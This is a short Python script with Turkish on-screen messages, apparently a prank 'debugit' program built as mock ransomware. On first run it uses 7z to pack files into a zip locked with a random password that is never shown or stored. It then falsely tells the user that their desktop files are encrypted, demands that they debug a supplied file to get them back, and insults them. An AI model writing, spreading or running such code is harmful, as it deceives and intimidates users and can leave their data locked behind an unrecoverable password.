#module
import os
import sys
import time
import random
os.system("echo off")
os.system("color a")
os.system("cls")
#define
def echo(val):
    os.system("echo "+val)
def cls():
    os.system("cls")
#get config file
with open("config.txt","r") as config:
    configLines = config.read()
del config
#do first open
if("first 0" in configLines):
    passwd = random.randint(100000,999999)
    os.system("7z\\7z.exe a -tzip \"yourFiles.zip\" -mx5 -p"+str(passwd))
    config = open("config.txt","r")
    text = config.read()
    echo("system: \"Merhaba! debugit'e hoş geldin\"")
    time.sleep(3)
    cls()
    time.sleep(1)
    echo("system: \"burada python öğreneceksiniz\"")
    time.sleep(3)
    echo("system: \"AHAHAH! tabii ki hayır\"")
    while True:
        
        echo("system: \"Sana bir dizi hatalı kod vereceğim")
        echo("system: \"Masaüstünde bulunan tüm dosyaların şifrelendi\"")
        echo("system: \"Eğer onları istiyorsan HATALARI AYIKLA!\"")
        echo("system: \"Hatalı kod bu dosyayı açtığın yerde -->HatalıKod.py\"")
        echo("system: \"Anladın mı?\"[evet(e),hayır(h)]")
        ok = input(">>> ")
        ok = ok.lower()
        cls()
        if(ok == "e" or ok == "evet"):
            break
        elif(ok == "h" or ok == "hayır"):
            echo("system: \"BUNDA ANLAMAYACAK NE VAR!?\"")
            echo("system: \"Sabrımı sınama emin ol hiç sabırlı değilimdir\"")
            time.sleep(3)
            cls()
        else:
            echo("system: \"Özür dilerim ilk sormam gereken şey zeka sahibi olup olmadığın olmalıydı\"")
            echo("system: \"evet veya hayır yazacaksın başka bir şey değil!")
            time.sleep(7) 
            cls()   
    cls()
    config = open("config.txt","w")
    text = text.replace("first 0","first 1")
    config.write(text)
    del config
    del text
del configLines




